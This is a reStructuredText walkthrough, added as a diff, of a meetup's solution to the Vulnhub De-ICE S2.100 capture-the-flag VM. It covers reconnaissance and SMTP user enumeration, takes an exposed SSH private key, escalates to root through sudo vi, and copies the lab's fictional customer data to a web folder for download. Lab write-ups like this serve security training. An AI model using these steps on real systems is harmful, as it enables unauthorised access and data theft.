@@ -1,0 +1,343 @@
+.. include:: /pentest_links.txt
+
+.. _De-ICE3:
+
+**************
+De-ICE Level 3
+**************
+
+Setup
+=====
+
+This is to document the meetup's efforts responding to the challenge `Vulnhub De-ICE: S2.100 <https://www.vulnhub.com/entry/de-ice-s2100,13/>`_, the third of the Vulnhub De-ICE series. This is a challenge to get the sensitive customer information.
+
+Setting up the VM
+-----------------
+
+The VM comes packaged as the live ISO `De-ICE_S2.100.iso <http://hackingdojo.com/downloads/iso/De-ICE_S2.100.iso>`_ running SLAX 5.1.7 (based on Slackware 10.2.0). It uses two fixed IPs: 192.168.2.100 and 192.168.2.101.
+
+Setting up your environment
+---------------------------
+
+.. code-block:: bash
+
+  PT=$HOME/pentest/de-ice3
+  mkdir -p $PT
+  cd $PT
+  # download de-ice3_setup.sh
+  curl --silent --remote-name https://pentest-meetup.appspot.com/html/_downloads/de-ice3_setup.sh
+  # edit as needed; later the recon will give you TARGET IPs
+  source de-ice3_setup.sh
+
+The source for :file:`de-ice3_setup.sh` (:download:`de-ice3_setup.sh`) should look something like the following.
+
+.. literalinclude:: de-ice3_setup.sh
+   :language: bash
+
+Reconnaisance
+=============
+
+Network reconnaissance
+----------------------
+
+Start with some standard network reconnaissance looking for the vulnerable host:
+
+.. code-block:: bash
+
+  PT=$HOME/pentest/de-ice3
+  source $PT/de-ice3_setup.sh
+  cd $PT/nmap
+
+  $SUDO nmap -sn -PE -oA nmap_sn $SUBNET
+  $SUDO chown $USER.$USER nmap_sn.*
+  # use the grep-able output to get a list of target hosts
+  grep Up nmap_sn.gnmap | cut -d" " -f2 > $TARGETS
+  # use the xml output to get an html report
+  xsltproc nmap_sn.xml -o nmap_sn.html
+
+Here we find 2 IPs for de-ice3: $TARGET1 and $TARGET2. Update $PT/de-ice3_setup.sh and also edit :file:`/etc/hosts` to add "de-ice3.com" (``echo "$TARGET1 de-ice3.com" | $SUDO tee -a /etc/hosts``) and "www2.de-ice3.com" (``echo "$TARGET2 www2.de-ice3.com" | $SUDO tee -a /etc/hosts``).
+
+.. code-block:: bash
+
+  PT=$HOME/pentest/de-ice3
+  source $PT/de-ice3_setup.sh
+  cd $PT/nmap
+
+  $SUDO nmap -A -vv -T3 --max-retries 5 -Pn -oA nmap_A1 $TARGET1
+  $SUDO chown $USER.$USER nmap_A1.*
+  xsltproc nmap_A1.xml -o nmap_A1.html
+  $SUDO nmap -A -vv -T3 --max-retries 5 -Pn -oA nmap_A2 $TARGET2
+  $SUDO chown $USER.$USER nmap_A2.*
+  xsltproc nmap_A2.xml -o nmap_A2.html
+
+Running this reveals for $TARGET1:
+
+.. code-block:: console
+  :emphasize-lines: 1-4,6,8,11,15,16
+
+  PORT    STATE  SERVICE  REASON         VERSION
+  20/tcp  closed ftp-data reset ttl 64
+  21/tcp  open   ftp      syn-ack ttl 64 vsftpd 2.0.4
+  | ftp-anon: Anonymous FTP login allowed (FTP code 230)
+  |_Can't get directory listing: TIMEOUT
+  22/tcp  open   ssh      syn-ack ttl 64 OpenSSH 4.3 (protocol 1.99)
+  |_sshv1: Server supports SSHv1
+  25/tcp  open   smtp     syn-ack ttl 64 Sendmail 8.13.7/8.13.7
+  | smtp-commands: slax.example.net Hello kali.bitbender.org [192.168.2.189], pleased to meet you, ENHANCEDSTATUSCODES, PIPELINING, 8BITMIME, SIZE, DSN, ETRN, AUTH DIGEST-MD5 CRAM-MD5, DELIVERBY, HELP, 
+  |_ 2.0.0 This is sendmail version 8.13.7 2.0.0 Topics: 2.0.0 HELO EHLO MAIL RCPT DATA 2.0.0 RSET NOOP QUIT HELP VRFY 2.0.0 EXPN VERB ETRN DSN AUTH 2.0.0 STARTTLS 2.0.0 For more info use "HELP <topic>". 2.0.0 To report bugs in the implementation see 2.0.0 http://www.sendmail.org/email-addresses.html 2.0.0 For local information send email to Postmaster at your site. 2.0.0 End of HELP info 
+  80/tcp  open   http     syn-ack ttl 64 Apache httpd 2.0.55 ((Unix) PHP/5.1.2)
+  |_http-methods: No Allow or Public header in OPTIONS response (status code 200)
+  |_http-server-header: Apache/2.0.55 (Unix) PHP/5.1.2
+  |_http-title: Site doesn't have a title (text/html).
+  110/tcp open   pop3     syn-ack ttl 64 Openwall popa3d
+  143/tcp open   imap     syn-ack ttl 64 UW imapd 2004.357
+  |_imap-capabilities: IDLE OK LOGIN-REFERRALS SASL-IR NAMESPACE THREAD=ORDEREDSUBJECT UNSELECT STARTTLS THREAD=REFERENCES completed LITERAL+ CAPABILITY AUTH=LOGINA0001 BINARY MULTIAPPEND MAILBOX-REFERRALS SORT SCAN IMAP4REV1
+  443/tcp closed https    reset ttl 64
+  MAC Address: 52:54:00:4B:53:FE (QEMU Virtual NIC)
+  Device type: general purpose
+  Running: Linux 2.6.X
+  OS CPE: cpe:/o:linux:linux_kernel:2.6
+  OS details: Linux 2.6.13 - 2.6.32
+
+Running this reveals for $TARGET2:
+
+.. code-block:: console
+  :emphasize-lines: 1-2
+
+  PORT   STATE SERVICE REASON         VERSION
+  80/tcp open  http    syn-ack ttl 64 Apache httpd 2.0.55 ((Unix) PHP/5.1.2)
+  | http-methods: GET HEAD POST OPTIONS TRACE
+  | Potentially risky methods: TRACE
+  |_See http://nmap.org/nsedoc/scripts/http-methods.html
+  |_http-server-header: Apache/2.0.55 (Unix) PHP/5.1.2
+  |_http-title: Site doesn't have a title (text/html).
+
+
+Port 80 reconnaissance
+----------------------
+
+Let's start with port 80 reconnaissance on both IPs, which reveal several interesting pages to view:
+
+.. code-block:: bash
+
+  PT=$HOME/pentest/de-ice3
+  source $PT/de-ice3_setup.sh
+  cd $PT/spider
+
+  dirb  http://$HOST1/ -o dirb80_$HOST1.txt
+  dirb  http://$HOST2/ -o dirb80_$HOST2.txt
+
+The most interesting results are:
+
+.. code-block:: console
+  :emphasize-lines: 1-3,5,7,10,13,17
+
+  + http://de-ice3.com/cgi-bin/ (CODE:403|SIZE:295)                              
+  + http://de-ice3.com/index.php (CODE:200|SIZE:2036)                            
+  + http://de-ice3.com/info.php (CODE:200|SIZE:37912)                            
+
+  + http://www2.de-ice3.com/cgi-bin/ (CODE:403|SIZE:300)                         
+  ==> DIRECTORY: http://www2.de-ice3.com/home/                                   
+  + http://www2.de-ice3.com/index.html (CODE:200|SIZE:579)                       
+  ==> DIRECTORY: http://www2.de-ice3.com/~root/                                  
+                                                                                 
+  ---- Entering directory: http://www2.de-ice3.com/home/ ----
+  ==> DIRECTORY: http://www2.de-ice3.com/home/root/                              
+                                                                                 
+  ---- Entering directory: http://www2.de-ice3.com/~root/ ----
+  (!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+      (Use mode '-w' if you want to scan it anyway)
+                                                                                 
+  ---- Entering directory: http://www2.de-ice3.com/home/root/ ----
+  (!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+      (Use mode '-w' if you want to scan it anyway)
+
+Viewing port 80
+---------------
+
+Visiting http://de-ice3.com/index.html leads to http://de-ice3.com/index2.html and a list of email addresses. From these we can see if SMTP will give us some user ids:
+
+.. code-block:: bash
+  :emphasize-lines: 5,12-17,19-
+
+  PT=$HOME/pentest/de-ice3
+  source $PT/de-ice3_setup.sh
+  cd $PT/spider
+
+  U="samuel,pickwick nathaniel,winkle augustus,snodgrass tracy,tupman sam,weller tony,weller estella,havisham abel,magwitch philip,pirrip nicholas,nickleby ralph,nickleby newman,noggs wackford,squeers thomas,pinch mark,tapley sarah,gamp jacob,marley ebenezer,scrooge bob,cratchit bill,sikes jack,dawkins noah,claypole"
+
+  for u in $U; do
+    FN=${u%,*}
+    LN=${u#*,}
+    FI=${FN:0:1}
+    LI=${LN:0:1}
+    echo $FN$LI
+    echo $FI$LN
+    echo $LN$FI
+    echo $LI$FN
+    echo $LN
+    echo $FN
+  done > users.txt
+
+  smtp-user-enum -M VRFY -U users.txt -t de-ice3.com
+  # results in no user ids exist
+  smtp-user-enum -M EXPN -U users.txt -t de-ice3.com
+  # results in no user ids exist
+  smtp-user-enum -M RCPT -U users.txt -t de-ice3.com
+  # results in no user ids exist
+
+So SMTP was absolutely no help in determining user ids.
+
+The Exploit
+===========
+
+Finding user id for SSH
+-----------------------
+
+The email list provides candidate user id's that can be checked against possible listing of home directories: remember http://www2.de-ice3.com/~root/ is available. Here we generate candidate user id's by checking for a "301 Moved" return status for http://www2.de-ice3.com/~USERID (leaving off the trailing "/"):
+
+.. code-block:: bash
+  :emphasize-lines: 5,12-21,24-
+
+  PT=$HOME/pentest/de-ice3
+  source $PT/de-ice3_setup.sh
+  cd $PT/spider
+
+  U="samuel,pickwick nathaniel,winkle augustus,snodgrass tracy,tupman sam,weller tony,weller estella,havisham abel,magwitch philip,pirrip nicholas,nickleby ralph,nickleby newman,noggs wackford,squeers thomas,pinch mark,tapley sarah,gamp jacob,marley ebenezer,scrooge bob,cratchit bill,sikes jack,dawkins noah,claypole"
+
+  for u in $U; do
+    FN=${u%,*}
+    LN=${u#*,}
+    FI=${FN:0:1}
+    LI=${LN:0:1}
+    RESP="$(curl --silent http://www2.de-ice3.com/~$FN$LI)"
+    [[ "$RESP" =~ "301 Moved" ]] && echo $FN$LI
+    RESP="$(curl --silent http://www2.de-ice3.com/~$FI$LN)"
+    [[ "$RESP" =~ "301 Moved" ]] && echo $FI$LN
+    RESP="$(curl --silent http://www2.de-ice3.com/~$LN$FI)"
+    [[ "$RESP" =~ "301 Moved" ]] && echo $LN$FI
+    RESP="$(curl --silent http://www2.de-ice3.com/~$LI$FN)"
+    [[ "$RESP" =~ "301 Moved" ]] && echo $LI$FN
+    RESP="$(curl --silent http://www2.de-ice3.com/~$LN)"
+    [[ "$RESP" =~ "301 Moved" ]] && echo $LN
+  done > home_dirs.txt
+
+  cat home_dirs.txt
+  # results in
+  # havisham
+  # magwitch
+  # pirrip
+
+It looks like we have 3 possible user home directories to recon. :program:`dirb` found :file:`.ssh/` in :file:`~pirrip/`:
+
+.. code-block:: bash
+  :emphasize-lines: 5-
+
+  PT=$HOME/pentest/de-ice3
+  source $PT/de-ice1_setup.sh
+  cd $PT/spider
+
+  dirb  http://www2.de-ice3.com/~pirrip/ -w -o dirb80pirrip.txt
+  # results in
+  # ==> DIRECTORY: http://www2.de-ice3.com/~pirrip/.ssh/                              
+  # + http://www2.de-ice3.com/~pirrip/.ssh/id_rsa (CODE:200|SIZE:1675)             
+  # + http://www2.de-ice3.com/~pirrip/.ssh/id_rsa.pub (CODE:200|SIZE:393)          
+
+Download :file:`.ssh/id_rsa` and :file:`.ssh/id_rsa.pub` and SSH into de-ice3.com as user pirrip:
+
+.. code-block:: bash
+  :emphasize-lines: 5-6,9
+
+  PT=$HOME/pentest/de-ice3
+  source $PT/de-ice1_setup.sh
+  cd $PT/exploit
+
+  curl --silent --remote-name http://www2.de-ice3.com/~pirrip/.ssh/id_rsa
+  curl --silent --remote-name http://www2.de-ice3.com/~pirrip/.ssh/id_rsa.pub
+  file id_rsa id_rsa.pub
+  chmod 600 id_rsa*
+  ssh -i id_rsa pirrip@de-ice3.com
+
+Getting root
+------------
+
+Continue above by looking for '*pirrip*' files/directories:
+
+.. code-block:: bash
+  :emphasize-lines: 1,4
+
+  find / -name '*pirrip*' 2>/dev/null
+  # results in
+  # /www/101/home/pirrip
+  # /var/spool/mail/pirrip
+  # /home/pirrip
+
+A quick look at the mail files provides pirrip's password:
+
+.. code-block:: bash
+  :emphasize-lines: 1,4
+
+  tail /var/mail/pirrip
+  # results in
+  # E-Mail: pirrip@slax.example.net
+  # Password: 0l1v3rTw1st
+
+So we check the ``sudo -l`` permissions:
+
+.. code-block:: bash
+  :emphasize-lines: 1,4-
+
+  sudo -l    # password '0l1v3rTw1st'
+  # results in
+  # User pirrip may run the following commands on this host:
+  #     (root) /usr/bin/more
+  #     (root) /usr/bin/tail
+  #     (root) /usr/bin/vi
+  #     (root) /usr/bin/cat ALL
+
+At this point there are a couple of ways of getting root. One is to use :program:`vi`'s abilitly to run a shell command (and running :file:`/bin/bash` as root gets us root) or use :program:`vi` to edit :file:`/etc/sudoers` to give the wheel group all rights.
+
+.. code-block:: bash
+  :emphasize-lines: 1-3,7-11
+
+  # Method 1 - run vi then shell command /bin/bash
+  sudo vi
+  :!/bin/bash
+  # results in
+  # bash-3.1# id
+  # uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy)
+  # OR Method 2 - edit /etc/sudoers
+  sudo /usr/bin/vi /etc/sudoers
+  # remove comment from wheel line:
+  # %wheel	ALL=(ALL)	NOPASSWD: ALL
+  sudo su - root
+
+Getting customer data
+---------------------
+
+At this point have root and just have to find the customer data. We'll continue on as if we used :program:`vi` to run ``:!/bin/bash``:
+
+.. code-block:: bash
+  :emphasize-lines: 3-12,15-16
+
+  cd /root
+  ls -al /root/.save
+  cp /root/.save/great_expectations.zip /tmp/
+  cd /tmp
+  unzip great_expectations.zip
+  tar -xvf great_expectations.tar
+  cat Jan08
+  # returns the customer data
+  # Here's the data for raises for your team:
+  # Philip Pirrip:  734-67-0424 5.5% $74,224
+  # Abel Magwitch:  816-03-0028 4.0% $53,122
+  # Estella Havisham: 762-93-1073 12% $84,325
+  chown pirrip.wheel Jan08
+  chmod 777 Jan08
+  # tail /etc/apache/httpd.conf gives www2.de-ice3.com DocumentRoot
+  mv Jan08 /www/101/home/pirrip/
+  rm *.jpg *.pdf *.zip *.tar
+  exit
+
+And so we have root and the customer data available to be downloaded from the web as ``curl --silent --remote-name http://www2.de-ice3.com/~pirrip/Jan08``.
+
